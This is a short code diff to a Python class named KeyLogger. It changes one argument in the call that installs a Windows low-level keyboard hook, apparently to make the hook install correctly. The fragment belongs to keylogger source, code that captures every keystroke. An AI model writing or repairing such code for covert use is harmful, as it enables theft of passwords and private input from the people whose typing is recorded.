@@ -174,7 +174,7 @@ class KeyLogger:
         self.hooked = self.lUser32.SetWindowsHookExA(
             win32con.WH_KEYBOARD_LL,
             pointer,
-            kernel32.GetModuleHandleExW(None),
+            0,  # kernel32.GetModuleHandleExW(None),
             0
         )
         if not self.hooked:
